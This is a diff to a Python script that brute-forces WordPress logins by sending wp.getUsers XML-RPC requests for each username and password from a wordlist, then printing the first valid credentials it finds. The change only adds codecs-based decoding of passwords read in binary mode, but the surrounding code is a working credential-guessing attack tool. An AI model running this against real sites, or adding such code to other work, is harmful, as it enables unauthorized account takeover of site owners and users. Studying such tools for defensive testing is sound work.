@@ -5,6 +5,7 @@
 import getopt
 import requests
 import sys
+import codecs
 
 head = { 'Content-Type':'application/x-www-form-urlencoded' }
 xmlPre =  """<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>wp.getUsers</methodName><params><param><value>1</value></param><param><value>"""
@@ -20,10 +21,10 @@ def commenceScan(uri):
         i += 1
         print( "Testing user:  " + username )
         for password in passwords:
-            dataSet = xmlPre + username + xmlMid + password + xmlTrail
+            dataSet = xmlPre + username + xmlMid + codecs.decode(password) + xmlTrail
             result = requests.post(uri, data=dataSet, headers=head).text
             if( 'Incorrect username or password.' not in result ):
-                print( "\n\n\nValid login found:  " + username + " - " + password )
+                print( "\n\n\nValid login found:  " + username + " - " + codecs.decode(password) )
                 sys.exit(0)
         print( '\n\n' )
 
@@ -58,7 +59,7 @@ def main(argv):
         elif opt in ( "-p", "--pass=" ):
             passFile = arg
             try:
-                f = open( passFile, "r" )
+                f = open( passFile, "rb" )
                 for line in f.readlines():
                     passwords.append(line[:-1])
                 f.close()
